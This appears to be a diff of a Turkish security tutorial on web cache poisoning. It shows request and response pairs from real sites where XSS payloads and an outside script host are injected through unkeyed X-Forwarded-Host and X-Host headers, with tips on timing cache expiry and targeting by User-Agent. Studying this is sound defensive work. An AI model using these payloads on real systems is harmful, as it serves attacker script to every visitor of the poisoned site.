@@ -27,81 +27,77 @@ Bazı şirketler Varnish gibi yazılımları kullanarak kendi önbelleklerini ba
 
 Ayrıca bu yaklaşımlar dışında Drupal gibi bazı popüler web uygulamalar ve frameworkler de zaten halihazırda yerleşik bir önbelleğe sahiptir. Bu sayede uygulama sunucusunun her defasında ilgili yanıtı sıfırdan işlemesine gereken kalmadan yanıt döndürülebilir. 
 
-Not:  İstemci tarafında depolanan tarayıcı önbellekleri ve DNS önbellekleri gibi başka önbellek türleri de mevcut lakin bunlar bu araştırmanın odak noktası olmadığı için bunları şimdilik es geçebiliriz.
+<p class="mavi"><strong>ℹ️ Not:</strong> İstemci tarafında depolanan tarayıcı önbellekleri ve DNS önbellekleri gibi başka önbellek türleri de mevcut lakin bunlar bu araştırmanın odak noktası olmadığı için bunları şimdilik es geçebiliriz.</p>
 
 ## Önbellek anahtarları | **Cache keys**
 
 Peki hangi istekler önbellekte tutulur ? Neticede tüm istekler önbelleğe alınmayacağına göre hangi isteklerin seçileceğine nasıl karar verilir ? 
 
-Önbelleğe hangi isteklerin alınması gerektiğine karar vermek için istekle birlikte gelen bazı değerlerin “anahtar” yani “key” olarak seçilip, bu anahtarlara göre benzersiz önbellekler tutulması gerekir. Peki bu ne demek oluyor. Örneğin basit bir önbellek mekanizmasında; statik içeriğe sahip sayfa için aynı URL adresini ziyaret edecek olan iki kullanıcı düşünelim. Bu önbellek mekanizması URL adresine bakarak ilk istekten sonra sunucunun döndürmüş olduğu yanıtı, tam olarak bu URL adresi ile eşleştirerek tekrar bu URL talep edildiğinde hızlıca önbellekten bu yanıtı döndürebilir.
+Önbelleğe hangi isteklerin alınması gerektiğine karar vermek için istekle birlikte gelen bazı değerlerin “**anahtar**” yani “**key**” olarak seçilip, bu anahtarlara göre benzersiz önbellekler tutulması gerekir. Peki bu ne demek oluyor. Örneğin basit bir önbellek mekanizmasında; statik içeriğe sahip sayfa için aynı URL adresini ziyaret edecek olan iki kullanıcı düşünelim. Bu önbellek mekanizması URL adresine bakarak ilk istekten sonra sunucunun döndürmüş olduğu yanıtı, tam olarak bu URL adresi ile eşleştirerek tekrar bu URL talep edildiğinde hızlıca önbellekten bu yanıtı döndürebilir.
 
 Aşağıdaki gibi spesifik bir URL adresine GET isteğinde bulunulduğunu farz edelim.
 
 ![istek-bilesenleri]({{ site.url }}/blog/img/web-cache-poisoning/istek-bilesenleri.png){:class="responsive img-zoomable"}
 
-Önbellek sunucusu da önbelleğe aldığı verilere tekrar erişmek üzere her birine benzersiz bir anahtar tanımlamak durumunda. Anahtar tanımlamak için da Method, URL, Protocol Sürümü ve Host başlığını kullanıp bir çeşit algoritma ile benzersiz bir key yani anahtar üretebilir.
+Önbellek sunucusu da önbelleğe aldığı verilere tekrar erişmek üzere her birine benzersiz bir anahtar tanımlamak durumunda. Anahtar tanımlamak için da <span style="color:red">Method</span>, <span style="color:green">URL</span>, <span style="color:DodgerBlue">Protocol Sürümü</span> ve <span style="color:brown">Host</span> başlığını kullanıp bir çeşit algoritma ile benzersiz bir key yani anahtar üretebilir.
 
 ![cache-key-uretimi]({{ site.url }}/blog/img/web-cache-poisoning/cache-key-uretimi.png){:class="responsive img-zoomable"}
 
-Burada benim verdiğim örnek yalnızca “key” yani “anahtar” kavramını basit şekilde açıklamak için. Önbellek mekanizması, benzersiz anahtar üretimi için HTTP isteğindeki hangi kısımları dikkate alacağına kendisi(nasıl konfigüre edildiyse) karar verir. Buradaki örneğimizde HTTP isteğinde yer alan “Method, URL, Protocol Sürümü ve Host başlığı” bilgileri “key” üretimi için kullanılan “cache key” değerleridir. Örneğin yalnızca URL kısmına bakan bir önbellek mekanizması için URL cache key üretimi için dikkate alınır ve yalnızca bu URL’in bulunduğu HTTP istekleri bu önbelleğe erişebilir. 
+Burada benim verdiğim örnek yalnızca “**key**” yani “**anahtar**” kavramını basit şekilde açıklamak için. Önbellek mekanizması, benzersiz anahtar üretimi için HTTP isteğindeki hangi kısımları dikkate alacağına kendisi(nasıl konfigüre edildiyse) karar verir. Buradaki örneğimizde HTTP isteğinde yer alan “<span style="color:red">Method</span>, <span style="color:green">URL</span>, <span style="color:DodgerBlue">Protocol Sürümü</span> ve <span style="color:brown">Host</span> başlığı” bilgileri “**key**” üretimi için kullanılan “**cache key**” değerleridir. Örneğin yalnızca URL üzerinden cache key üreten önbellek mekanizmasında; sadece URL dikkate alınır ve yalnızca bu URL’in bulunduğu HTTP istekleri bu önbelleğe erişebilir. 
 
 Bu durumun daha net anlaşılması için cache hizmeti de sunan bir CDN olan cloudflare üzerinde yer alan “cache rules” sekmesinden, önbellekleme için gerekli olan şartların ne kadar çeşitli olabileceğine bizzat kendiniz de göz atabilirsiniz.
 
 ![cdn-cache-kurallari]({{ site.url }}/blog/img/web-cache-poisoning/cdn-cache-kurallari.png){:class="responsive img-zoomable"}
 
-Gördüğünüz gibi gelen istekteki pek çok farklı kriteri “ve” “veya” koşullarıyla birbirine bağlayarak, önbellek oluşturma kuralını istediğimiz gibi düzenleyebiliyoruz. Pek çok önbellek mekanizması da benzer şekilde kuralları özelleştirme noktasında bu şekilde imkanlar tanıyor.
+Gördüğünüz gibi gelen istekteki pek çok farklı kriteri "**and**" "**or**" yani “**ve**” “**veya**” koşullarıyla birbirine bağlayarak, önbellek oluşturma kuralını istediğimiz gibi düzenleyebiliyoruz. Pek çok önbellek mekanizması da benzer şekilde kuralları özelleştirme noktasında bu şekilde imkanlar tanıyor.
 
 Önbelleğe alma kavramı basit gözükebilir ancak bazı durumlarda risk teşkil edebiliyor. Önbellek mekanizması bir kaynak için bir istek aldığında, bu kaynağın bir kopyasının önceden kaydedilmiş olup olmadığına ve bununla yanıt verip veremeyeceğine veya isteği uygulama sunucusuna iletmesi gerekip gerekmediğine karar vermesi gerekiyor.
 
-Kullanıcılardan gelen iki isteğin aynı kaynağı talep edip etmediğini belirlemek çoğunlukla zordur. Örneğin toplam bayt uzunluğunun aynı olması durumu geçersizdir çünkü bayt uzunluğunu etkileyebilecek `User-Agent` gibi kullanıcı tarafına özel olarak değişen başlıklar mevcuttur. Kullanıcılar aynı tarayıcıyı kullanıyor olsa bile sürüm farkından dolayı toplam bayt birbirine eşit olmaz. 
+Kullanıcılardan gelen iki isteğin aynı kaynağı talep edip etmediğini belirlemek çoğunlukla zordur. Örneğin toplam bayt uzunluğunun aynı olması durumu geçersizdir çünkü bayt uzunluğunu etkileyebilecek `User-Agent` gibi kullanıcı tarafına özel olarak değişen başlıklar mevcuttur. Kullanıcılar aynı tarayıcıyı kullanıyor olsa bile sürüm farkından dolayı toplam bayt birbirine eşit olmayabilir. 
 
-```bash
-GET /blog/post.php?mobile=1 HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /blog/post.php?mobile<span class="o">=</span>1 HTTP/1.1
 Host: example.com
-User-Agent: Mozilla/5.0 … Firefox/57.0
-Accept: */*; q=0.01
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
+<span style="color:DodgerBlue">User-Agent: Mozilla/5.0 … Firefox/57.0</span>
+Accept: <span class="k">*</span>/<span class="k">*</span><span class="p">;</span> <span class="nv">q</span><span class="o">=</span>0.01
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
 Referer: https://google.com/
-Cookie: jessionid=xyz;
+Cookie: <span class="nv">jessionid</span><span class="o">=</span>xyz<span class="p">;</span>
 Connection: close
-```
+</code></pre></div></div>
 
-```bash
-GET /blog/post.php?mobile=1 HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /blog/post.php?mobile<span class="o">=</span>1 HTTP/1.1
 Host: example.com
-User-Agent: Mozilla/5.0 … Firefox/58.112
-Accept: */*; q=0.01
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
+<span style="color:DodgerBlue">User-Agent: Mozilla/5.0 … Firefox/58.112</span>
+Accept: <span class="k">*</span>/<span class="k">*</span><span class="p">;</span> <span class="nv">q</span><span class="o">=</span>0.01
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: <span class="nb">gzip</span>, deflate
 Referer: https://google.com/
-Cookie: jessionid=xyz;
+Cookie: <span class="nv">jessionid</span><span class="o">=</span>xyz<span class="p">;</span>
 Connection: close
-```
+</code></pre></div></div>
 
 Bu sebeple her iki kullanıcının da aynı kaynağa erişmek istediğini toplam bayt üzerinden tayin etmeye çalışmak sağlıklı değildir. 
 
-Zaten bu sebeple biraz önce bahsettiğimiz gibi önbellek mekanizmaları bu sorunu çözmek üzere, gelen HTTP isteğinde yer alan bazı belirli bileşenleri önbellek anahtarı üretmek üzere kabul edip işler. **Yani HTTP isteğindeki her veri değil, yalnızca bazı bileşenler dikkate alınır.**  Anlatımlar sırasında anahtar üretimi için kullanılan HTTP bileşenlerini mavi renkle özellikle belirtiyor olacağım. Yukarıdaki bir önceki örnek çıktılarına bakacak olursanız mavi renkle işaretlenmiş kısımlar aslında önbellek mekanizması için önbellek anahtarı oluşturmak adına dikkate alınan kısımlardır. Bunlar dışındaki HTTP istek içeriğindeki tüm bileşenler “unkeyed input”, yani anahtarlanmamış ya da daha doğrusu anahtarlama için kullanılmayan girdilerdir. Bu kavramlar önemli olduğu için iyi anlaşılmaları önemli.
+Zaten bu sebeple biraz önce bahsettiğimiz gibi önbellek mekanizmaları bu sorunu çözmek üzere, gelen HTTP isteğinde yer alan bazı belirli bileşenleri önbellek anahtarı üretmek üzere kabul edip işler. **Yani HTTP isteğindeki her veri değil, yalnızca bazı bileşenler dikkate alınır.**  Anlatımlar sırasında anahtar üretimi için kullanılan HTTP bileşenlerini mavi renkle özellikle belirtiyor olacağım. Yukarıdaki bir önceki örnek çıktılarına bakacak olursanız mavi renkle işaretlenmiş kısımlar aslında önbellek mekanizması için önbellek anahtarı oluşturmak adına dikkate alınan kısımlardır. Bunlar dışındaki HTTP istek içeriğindeki tüm bileşenler “**unkeyed input**”, yani anahtarlanmamış ya da daha doğrusu anahtarlama için kullanılmayan girdilerdir. Bu kavramlar önemli olduğu için iyi anlaşılmaları önemli.
 
-Yani örneğin URL ve Host başlığına göre anahtar oluşturan bir önbellek mekanizması için aşağıdaki iki HTTP isteği de aynı kabul edilir. Dolayısıyla ilk istek için üretilmiş olan yanıt önbellek üzerinden ikinci isteğe de dönülür.
+Yani örneğin **URL** ve **Host** başlığına göre anahtar oluşturan bir önbellek mekanizması için aşağıdaki iki HTTP isteği de aynı kabul edilir. Dolayısıyla ilk istek için üretilmiş olan yanıt önbellek üzerinden ikinci isteğe de dönülür.
 
-```bash
-GET /blog/post.php?mobile=1 HTTP/1.1
-Host: example.com
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET <span style="color:DodgerBlue">/blog/post.php?mobile<span class="o">=</span>1</span> HTTP/1.1
+<span style="color:DodgerBlue">Host: example.com</span>
 User-Agent: Mozilla/5.0 … Firefox/57.0
-Cookie: language=tr;
+Cookie: <span style="color:red"><span class="nv">language</span><span class="o">=</span><span class="nb">tr</span></span><span class="p">;</span>
 Connection: close
-```
+</code></pre></div></div>
 
-```bash
-GET /blog/post.php?mobile=1 HTTP/1.1
-Host: example.com
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET <span style="color:DodgerBlue">/blog/post.php?mobile<span class="o">=</span>1</span> HTTP/1.1
+<span style="color:DodgerBlue">Host: example.com</span>
 User-Agent: Mozilla/5.0 … Firefox/57.0
-Cookie: language=en;
+Cookie: <span style="color:red"><span class="nv">language</span><span class="o">=</span>en</span><span class="p">;</span>
 Connection: close
-```
+</code></pre></div></div>
 
-Eğer dikkat edecek olursanız, her iki istekteki dil farklı olduğu için ikinci isteğe önbellekten döndürülen yanıt kullanıcı için yanlış dildedir. Bu durumun nedeni; “anahtarlama” için kullanılmayan tüm diğer kısımların, önbellekten yanıt verilen tüm kullanıcılara değişmeden iletiliyor olması tabii. Kötü niyetli olanları da dahil!
+Eğer dikkat edecek olursanız, her iki istekteki <span style="color:red">dil farklı olduğu için</span> ikinci isteğe önbellekten döndürülen yanıt aslında kullanıcı için yanlış dildedir. Bu durumun nedeni; “anahtarlama” için kullanılmayan tüm diğer kısımların, önbellekten yanıt verilen tüm kullanıcılara değişmeden iletiliyor olması tabii. Kötü niyetli olanları da dahil!
 
 Aslında teorik olarak Cache mekanizmasındaki anahtar oluşturmak için kullanılması gerekenlerin belirtildiği konfigürasyonlara ek olarak, anahtarlanması istenen tüm ek istek başlıklarını belirtmek için web sunucusu yanıtında '`Vary`' başlığı kullanılabilir. Fakat pratikte Cloudflare gibi CDN'ler `Vary` başlığını göz ardı edip yalnızca kendi konfigürasyonları dahilinde anahtar oluşturduğu için `Vary` başlığı çoğu durumda etkisiz kalabiliyor.  
 
@@ -112,78 +108,74 @@ Yine de `Vary` başlığını görmezden gelmeyen bir cache mekanizması kullan�
 Önbellek zehirlenmesi, zararlı olabilecek yanıtın önbelleğe kaydolmasını sağlayan istek göndermektir. 
 
 ![portswigger-cache-poisoning]({{ site.url }}/blog/img/web-cache-poisoning/portswigger-cache-poisoning.png){:class="responsive img-zoomable"}
+Kaynak:Portswigger
 
-Bu yazıda önbellek anahtarı için kullanılmayan HTTP başlıkları gibi girişleri(unkeyed input) kullanarak önbellek zehirlemesini ele alacağız. Tabii ki önbellek zehirlemesi için tek yaklaşım bu değil. HTTP Response Splitting ve [Request Smuggling](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) yaklaşımları da kullanılabilir. Ayrıca web önbellek mekanizmasının “[Web Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)” ismi verilen başka bir zafiyete yol açtığını da belirtmek isterim. Lakin “[Web Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html) ” ile önbellek zehirlenmesini karıştırmayın lütfen. İkisi farklı yaklaşımlar. Tek ortak noktası web önbelleklerinin neden olmasıdır. 
+Bu yazıda önbellek anahtarı için kullanılmayan HTTP başlıkları gibi girişleri(unkeyed input) kullanarak önbellek zehirlemesini ele alacağız. Tabii ki önbellek zehirlemesi için tek yaklaşım bu değil. HTTP Response Splitting ve [Request Smuggling](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) yaklaşımları da kullanılabilir. Ayrıca web önbellek mekanizmasının “[Web Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)” ismi verilen başka bir zafiyete yol açtığını da belirtmek isterim. Lakin “[Web Cache Deception](https://linuxdersleri.net/web-cache-deception) ” ile önbellek zehirlenmesini karıştırmayın lütfen. İkisi farklı yaklaşımlar. Tek ortak noktası web önbelleklerinin neden olmasıdır. 
 
 ## Metodoloji
 
 Cache poisoning zafiyetleri için aşağıdaki metodolojiyi kullanıyor olacağız:
 
 ![portswigger-metodoloji]({{ site.url }}/blog/img/web-cache-poisoning/portswigger-metodoloji.png){:class="responsive img-zoomable"}
+Kaynak:Portswigger
 
 İlk adım olarak unkeyed input yani anahtar olarak kabul edilmeyen girdileri bulmamız gerekiyor. Bu işi manuel olarak tek tek elle yapmak fevkalade zor bu sebeple Param Miner isimli burp eklentisini kullanarak header/cookie isimlerini otomatik olarak test edip, yanıtlar üzerindeki etkilerine bakıyor olacağız. 
 
-Anahtarlanmamış bir giriş bulduktan sonra, sonraki adımlar onunla ne kadar hasar verebileceğinizi değerlendirmek ve ardından onu önbellekte saklamaya çalışmaktır. Eğer önbelleğe alınmasını sağlayamazsak, önbelleğin nasıl çalıştığını daha iyi anlamanız ve önbelleğe alınabilir bir hedef sayfayı bulmanız gerekiyor. Bir sayfanın önbelleğe alınıp alınmayacağı, dosya uzantısı, içerik türü, dizin adresi, durum kodu ve yanıt başlıkları gibi çeşitli faktörlere bağlı olabilir.
+Anahtarlanmamış bir giriş bulduktan sonra, sonraki adımlar onunla ne kadar hasar verebileceğinizi değerlendirmek ve ardından onu önbellekte saklamaya çalışmaktır. Eğer önbelleğe alınmasını sağlayamazsanız, önbelleğin nasıl çalıştığını daha iyi anlamanız ve önbelleğe alınabilir bir hedef sayfayı bulmanız gerekiyor. Bir sayfanın önbelleğe alınıp alınmayacağı, dosya uzantısı, içerik türü, dizin adresi, durum kodu ve yanıt başlıkları gibi çeşitli faktörlere bağlı olabilir.
 
-Önbellekten dönülen aynı yanıtlar dolayısıyla, bulmaya çalıştığımız diğer anahtar olarak kullanılmayan girişler maskelenebilir. Yani başka anahtarsız girişler olsa bile önbellek dolayısıyla bunları fark etmeyebiliriz. Bu sebeple her bir isteğin benzersiz olmasını sağlamak için önbellek bozucu rastgele bir değeri her deneme göndermemiz gerekir. Eğer keşif için param miner kullanıyorsanız parametre olarak $randomplz ekleyerek her isteğin benzeriz bir önbellek anahtarına sahip olmasını sağlayabilirsiniz. Ayrıca bu sayede canlı ortamda çalışan bir websitesini, diğer kullanıcılara zarar vermeden önbelleğe alma davranışları açısından kolayca test etmeniz de mümkün olur. 
+Önbellekten dönülen aynı yanıtlar dolayısıyla, bulmaya çalıştığımız diğer anahtar olarak kullanılmayan girişler maskelenebilir. Yani başka anahtarsız girişler olsa bile önbellek dolayısıyla bunları fark etmeyebiliriz. Bu sebeple her bir isteğin benzersiz olmasını sağlamak için önbellek bozucu rastgele bir değeri her denemede göndermemiz gerekir. Eğer keşif için param miner kullanıyorsanız parametre olarak $randomplz ekleyerek her isteğin benzeriz bir önbellek anahtarına sahip olmasını sağlayabilirsiniz. Ayrıca bu sayede canlı ortamda çalışan bir websitesini, diğer kullanıcılara zarar vermeden önbelleğe alma davranışları açısından kolayca test etmeniz de mümkün olur. 
 
 ## Gerçek Dünyadan Vakalar
 
 ### Basit Zehirleme
 
-Red Hat’in ana sayfasında Param Miner anahtar olarak kullanılmayan bir girdi buldu.
+Param Miner, Red Hat’in ana sayfasında anahtar olarak kullanılmayan bir girdi buldu.
 
-```bash
-GET /en?cb=1 HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en?cb<span class="o">=</span>1 HTTP/1.1
 Host: www.redhat.com
-X-Forwarded-Host: canary
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: canary</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Cache-Control: public, no-cache
 …
-<meta property="og:image" content="https://canary/cms/social.png" />
-```
+&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:image"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"https://<span style="color:DodgerBlue">canary</span>/cms/social.png"</span> /&gt;
+</code></pre></div></div>
 
-Yanıtta görülebileceği gibi `X-Forwarded-Host` başlığının, Open Graph URL meta etiketi oluşturmada kullanıldığını görebiliyoruz.
+Yanıta baktığımızda `X-Forwarded-Host` başlığının, Open Graph URL meta etiketi oluşturmada kullanıldığını görebiliyoruz.
 
-Not: ***Open Graph*** Protokolü, ***URL***'lerin sosyal medyada paylaşıldığında nasıl görüntüleneceğini kontrol eden bir çözümdür.
+<p class="mavi"><strong>ℹ️ Not:</strong> <strong><em>Open Graph</em></strong>&nbsp;Protokolü,&nbsp;<strong><em>URL</em></strong>‘lerin sosyal medyada paylaşıldığında nasıl görüntüleneceğini kontrol eden bir çözümdür.</p>
 
 `X-Forwarded-Host` başlığının yanıta yansıdığını gördükten sonra ilk adım bunu nasıl kötüye kullanabileceğimizi keşfetmekte. Örneğin XSS payload’ı ekleyip deneyebiliriz.
 
-```bash
-GET /en?dontpoisoneveryone=1 HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en?<span style="color:DodgerBlue">onbellekdenemesi<span class="o">=</span>1</span> HTTP/1.1
 Host: www.redhat.com
-X-Forwarded-Host: a."><script>alert(1)</script>
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: a.<span class="s2">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span></code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Cache-Control: public, no-cache
 …
-<meta property="og:image" content="https://a."><script>alert(1)</script>"/> 
-```
+&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:image"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"https://a."</span><span style="color:DodgerBlue"><span class="o">&gt;</span>&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt;</span><span class="s2">"/&gt; 
+</span></code></pre></div></div>
 
-Evet istediğimiz xss yükünü yanıta ekleyebildik. Şimdi bu yanıtın diğer kullanıcılar gösterilebilmesi için önbelleğe alındığından emin olmamız gerek. Bu noktada yanıtta yer alan `Cache-Control: no-cache` başlığın bizi vazgeçirmesine izin vermemeliyiz. Zira bir saldırı girişiminde bulunmak, işe yaramayacağını varsaymaktan her zaman daha iyidir. Önbelleğe alınma durumunu, isteği kötü amaçlı başlık olmadan yeniden göndererek ve ardından URL'yi doğrudan farklı bir makinedeki(mümkünse farklı bir public ip üzerinden) tarayıcıdan açarak kesin olarak doğrulayabilirsiniz:
+Evet istediğimiz xss yükünü yanıta ekleyebildik. Şimdi bu yanıtın diğer kullanıcılar gösterilebilmesi için önbelleğe alındığından emin olmamız gerek. Bu noktada yanıtta yer alan `Cache-Control: no-cache` başlığının bizi vazgeçirmesine izin vermemeliyiz. Zira bir saldırı girişiminde bulunmak, işe yaramayacağını varsaymaktan her zaman daha iyidir. Önbelleğe alınma durumunu, isteği kötü amaçlı başlık olmadan yeniden göndererek ve ardından URL'yi doğrudan farklı bir makinedeki(mümkünse farklı bir public ip üzerinden) tarayıcıdan açarak kesin olarak doğrulayabilirsiniz:
 
-```bash
-GET /en?onbellekdenemesi=1 HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en?<span style="color:DodgerBlue">onbellekdenemesi<span class="o">=</span>1</span> HTTP/1.1
 Host: www.redhat.com
-```
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 …
-<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
-```
+&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:image"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"https://a."</span><span style="color:DodgerBlue"><span class="o">&gt;</span>&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt;</span><span class="s2">"/&gt; 
+</span></code></pre></div></div>
 
 Görüldüğü gibi farklı bir cihazdan aynı link ziyaret edildiğinde, istekte herhangi bir ek başlık olmamasına rağmen xss yükünün bulunduğu yanıtın önbellekten döndürüldüğünü teyit etmiş olduk.
 
-Kısa bir DNS sorgusu ile www.redhat.com’in aslında [www.redhat.com.edgekey.net](http://www.redhat.com.edgekey.net) adresinin CNAME’i olarak tutulduğunu, dolayısıyla Akamai’nin CDN hizmetini kullanarak cache sunduğunu da teyit edebiliyoruz. 
+Kısa bir DNS sorgusu ile www.redhat.com’un aslında [www.redhat.com.edgekey.net](http://www.redhat.com.edgekey.net) adresinin CNAME’i olarak tutulduğunu, dolayısıyla Akamai’nin CDN hizmetini kullanarak cache sunduğunu da teyit edebiliyoruz. 
 
 ```bash
-PS C:\Users\pc> nslookup.exe www.redhat.com
+$$ nslookup.exe www.redhat.com
 Server:  one.one.one.one
 Address:  1.1.1.1
 
@@ -199,48 +191,44 @@ Aliases:  www.redhat.com
 
 ### Gizli Zehirlenme
 
-Önceki örnekte sitenin gerçek ziyaretçilerini etkilememek için https://www.redhat.com/en?onbellekdenemesi=1 adresini zehirleyerek zafiyetin varlığını kanıtladık. Eğer doğrudan ana sayfayı zehirlemek istiyorsak, önbelleğe alınan yanıtın süresi dolduktan hemen sonra bizim zararlı yükü barındıran isteği gönderip bunun önbelleğe alınmasını sağlamamız gerekiyor.
+Önceki örnekte sitenin gerçek ziyaretçilerini etkilememek için https://www.redhat.com/en?<span style="color:DodgerBlue">onbellekdenemesi=1</span> adresini zehirleyerek zafiyetin varlığını kanıtladık. Eğer doğrudan ana sayfayı zehirlemek istiyorsak, önbelleğe alınan yanıtın süresi dolduktan hemen sonra bizim zararlı yükü barındıran isteği gönderip bunun önbelleğe alınmasını sağlamamız gerekiyor.
 
 Bunu kaba yoldan veya daha stratejik biçimde gerçekleştirebiliriz. Kaba yol olarak burp intruder veya benzeri bir script yazarak sürekli olarak aynı isteği gönderip, zamanı geldiğinde bu isteğin önbelleğe alınmasını sağlayabiliriz. Fakat bu çoğu durumda rate limit dolayısıyla şüpheli işlem kısıtlamalarına takılacaktır. Bunun yerine cache geçerlilik mekanizmasının nasıl çalıştığını anlayıp tam zamanında isteği göndermek çok daha zarif bir yaklaşım. Eğer yanıtlarda açıkça önbelleğin geçerlilik süresi belirtilmiyorsa bu tespiti gerçekleştirmek biraz zorlayıcı olabilir.
 
 Yine de pek çok websitesi önbellek geçerlilik süresi hakkında yanıtlarda bilgi sunabiliyor.
 
-```bash
-GET / HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: unity3d.com
-X-Host: portswigger-labs.net
-```
+<span style="color:DodgerBlue">X-Host: portswigger-labs.net</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Via: 1.1 varnish-v4
 Age: 174
-Cache-Control: public, max-age=1800
+Cache-Control: public, max-age<span class="o">=</span>1800
 …
-<script src="https://portswigger-labs.net/sites/files/foo.js"></script>
-```
+&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"https://<span style="color:DodgerBlue">portswigger-labs.net</span>/sites/files/foo.js"</span><span class="o">&gt;</span>&lt;/script&gt;
+</code></pre></div></div>
 
-Burada, `X-Host` başlığının anahtar olarak kullanılmadığı ve yanıtta yansıtıldığını görebiliyoruz. Ayrıca yanıtta yer alan `Cache-Control: max-age=1800` değer sayesinde önbelleğe alınan verilerin ne kadar süreyle önbellekte tutulduğu konusunda da bilgi edinebiliyoruz. Birlikte ele alındığında bunlar bize, yanıtımızın önbelleğe alınmasını sağlamak için veri yükümüzü göndermemiz gereken tam saniyeyi söyler.
+Burada, `X-Host` başlığının anahtar olarak kullanılmadığı ve yanıtta yansıtıldığını görebiliyoruz. Ayrıca yanıtta yer alan `Cache-Control: max-age=1800` değeri sayesinde önbelleğe alınan verilerin ne kadar süreyle önbellekte tutulduğu konusunda da bilgi edinebiliyoruz. Birlikte ele alındığında bunlar bize, yanıtımızın önbelleğe alınmasını sağlamak için veri yükümüzü göndermemiz gereken tam saniyeyi söyler.
 
 ### Seçici-Hedef Odaklı Zehirleme
 
 HTTP başlıkları cache mekanizmaları konusunda pek çok yararlı bilgi sunabiliyor. Aşağıdaki örnek, Fastly kullanan popüler bir websitesine ait.
 
-```bash
-GET / HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
 Host: redacted.com
 User-Agent: Mozilla/5.0 … Firefox/60.0
-X-Forwarded-Host: a"><iframe onload=alert(1)>
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: a<span class="s2">"&gt;&lt;iframe onload=alert(1)&gt;</span>
+</span></code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 X-Served-By: cache-lhr6335-LHR
 Vary: User-Agent, Accept-Encoding
 …
-<link rel="canonical" href="https://a">a<iframe onload=alert(1)>
-</iframe> 
-```
+&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"canonical"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"https://a"</span><span style="color:DodgerBlue"><span class="o">&gt;</span>a&lt;iframe <span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)&gt;</span></span>
+&lt;/iframe&gt; 
+</code></pre></div></div>
 
 Bu örnek başlangıçta ilk örnekle neredeyse aynı görünüyor. Ancak `Vary` başlığı bize `User-Agent`’in önbellek anahtarının bir parçası olabileceğini belirtiyor ve manuel testler bunu doğruluyor. Bu durum, Firefox 60 kullandığımızı iddia ettiğimiz için, istismarımızın yalnızca diğer Firefox 60 kullanıcılarına sunulacağı anlamına geliyor. Dolayısıyla hedef odaklı seçici bir saldırı için bu tür anahtar değerleri kullanılabilir. 
 
@@ -250,21 +238,19 @@ Anahtar olarak kullanılmayan girdilere XSS yükleri ekleyerek zafiyet oluşturm
 
 Örneğin aşağıdaki istek ve yanıt üzerinden ilerleyecek olursak;
 
-```bash
-GET /dataset HTTP/1.1
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /dataset HTTP/1.1
 Host: catalog.data.gov
-X-Forwarded-Host: canary
-```
+<span style="color:DodgerBlue">X-Forwarded-Host: canary</span>
+</code></pre></div></div>
 
-```bash
-HTTP/1.1 200 OK
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
 Age: 32707
 X-Cache: Hit from cloudfront 
 …
-<body data-site-root="https://canary/">
-```
+&lt;body data-site-root<span class="o">=</span><span class="s2">"https://<span style="color:DodgerBlue">canary</span>/"</span><span class="o">&gt;</span>
+</code></pre></div></div>
 
